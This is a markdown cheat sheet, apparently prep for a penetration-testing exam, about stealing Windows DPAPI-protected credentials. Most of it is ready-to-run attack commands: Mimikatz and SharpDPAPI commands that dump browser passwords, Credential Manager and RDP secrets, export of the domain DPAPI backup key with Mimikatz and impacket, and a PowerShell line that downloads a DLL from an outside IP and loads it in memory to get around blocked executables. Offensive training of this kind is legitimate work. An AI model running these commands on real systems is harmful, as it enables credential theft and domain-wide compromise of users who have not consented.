# DPAPI — Credential Extraction

DPAPI (Data Protection API) is what Windows uses to encrypt stored credentials — Chrome passwords, Windows Credential Manager, RDP saved passwords, WiFi keys. With SYSTEM or admin access, you can decrypt everything.

---

## What DPAPI Protects (High-Value Targets)

| Store | Location | Content |
|-------|----------|---------|
| Chrome / Edge passwords | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` | Cleartext passwords |
| Windows Credential Manager | `%LOCALAPPDATA%\Microsoft\Credentials\` | Domain credentials, saved passwords |
| RDP saved credentials | `%LOCALAPPDATA%\Microsoft\Credentials\` | RDP server passwords |
| WiFi profiles | `C:\ProgramData\Microsoft\Wlansvc\Profiles\` | WiFi pre-shared keys |
| Outlook passwords | Registry / Credential Manager | Email server creds |
| Private keys | `%APPDATA%\Microsoft\Crypto\RSA\` | TLS private keys |

---

## Method 1: Mimikatz (Interactive — Requires SYSTEM or DA)

```
# Decrypt all Credential Manager entries:
mimikatz# sekurlsa::dpapi

# Decrypt DPAPI blobs using the system masterkey:
mimikatz# dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}" /rpc

# Chrome passwords:
mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

# All credentials from Credential Manager:
mimikatz# dpapi::cred /in:"%localappdata%\Microsoft\Credentials\{GUID}"
```

---

## Method 2: SharpDPAPI (C# — Reflective Load or Run Directly)

SharpDPAPI automates DPAPI decryption and is much cleaner for exams.

```powershell
# Download and run (if not in repo):
# https://github.com/GhostPack/SharpDPAPI

# Dump all Chrome passwords (user context, auto-resolves key):
.\SharpDPAPI.exe cookies
.\SharpDPAPI.exe logins           # passwords
.\SharpDPAPI.exe credentials      # Windows Credential Manager

# Decrypt with SYSTEM masterkey (from DA — decrypts ANY user's stuff):
.\SharpDPAPI.exe masterkeys /rpc   # fetches backup key from DC

# Decrypt a specific credential file:
.\SharpDPAPI.exe credentials /target:C:\Users\victim\AppData\Local\Microsoft\Credentials\GUID

# Dump everything at once:
.\SharpDPAPI.exe triage

# Load SharpDPAPI.dll in-memory (if exe is blocked):
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.202/SharpDPAPI.dll')
[System.Reflection.Assembly]::Load($bytes)
[SharpDPAPI.Program]::Main(@("logins"))
```

---

## Method 3: Decrypt Chrome Passwords (Manual — Python)

```bash
# Copy Chrome database to Kali first:
# (From Windows): copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\ld.db

# Kali: decrypt with the LOCAL_STATE encryption key (Chrome 80+):
# pip3 install pycryptodome

python3 << 'EOF'
import sqlite3, json, base64, subprocess
from Crypto.Cipher import AES

# Path to copied files on Kali
local_state = open('/tmp/Local State').read()
db_path = '/tmp/Login Data'

# Get encrypted key from Local State:
encrypted_key = base64.b64decode(json.loads(local_state)['os_crypt']['encrypted_key'])[5:]
# Note: the [5:] strips the DPAPI prefix "DPAPI"

# On Kali you need the decrypted key — use mimikatz/SharpDPAPI on Windows first
# OR: copy the key after mimikatz decrypts it
# For exam: use SharpDPAPI.exe logins — it does this automatically
EOF
```

---

## Method 4: Credential Manager Dump (PowerShell)

```powershell
# List all stored credentials (names only):
cmdkey /list

# Dump Credential Manager via Mimikatz:
# (after loading Mimikatz in Meterpreter)
mimikatz# dpapi::cred /in:"%localappdata%\Microsoft\Credentials\*"

# Via Windows built-in (shows limited info):
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | ForEach-Object {$_.RetrievePassword(); $_}
```

---

## Method 5: Domain Backup Key (Decrypt Any User's DPAPI)

As Domain Admin, you can extract the DPAPI backup key from the DC. This key decrypts the masterkey of ANY user in the domain.

```powershell
# Extract backup key via Mimikatz:
mimikatz# lsadump::backupkeys /system:<DC_IP> /export

# This exports a .pvk file — keep it
# Use with SharpDPAPI to decrypt any user's DPAPI material offline:
.\SharpDPAPI.exe machinemasterkeys /pvk:backupkey.pvk
.\SharpDPAPI.exe credentials /pvk:backupkey.pvk
.\SharpDPAPI.exe logins /pvk:backupkey.pvk

# From Kali via impacket (DA required):
impacket-dpapi backupkeys --export -t corp.com/Administrator -hashes :NTHASH -dc-ip <DC_IP>
```

---

## Quick Exam Workflow

```
1. Get SYSTEM / DA
2. Run: .\SharpDPAPI.exe triage
   → Dumps Chrome passwords, Credential Manager, RDP creds
3. If you want to decrypt offline:
   → Extract backup key: lsadump::backupkeys /export (Mimikatz)
   → Copy encrypted credential files
   → Decrypt offline: SharpDPAPI.exe credentials /pvk:backupkey.pvk
4. High-value targets to look for:
   → Saved RDP credentials (other servers)
   → Domain service account creds
   → VPN/web portal credentials
```

---

## Find DPAPI Credential Files

```powershell
# Find all credential files (Credential Manager):
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials\" -Force
Get-ChildItem "C:\Users\*\AppData\Local\Microsoft\Credentials\" -Force 2>$null

# Find masterkey files:
Get-ChildItem "$env:APPDATA\Microsoft\Protect\" -Force -Recurse

# Find Chrome Login Data:
Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Force 2>$null
Get-ChildItem "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" -Force 2>$null
```
